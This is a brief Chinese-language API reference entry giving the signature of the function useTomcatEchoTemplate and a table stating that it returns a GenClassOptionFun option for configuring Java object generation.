#### 定义

`useTomcatEchoTemplate() GenClassOptionFun`

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


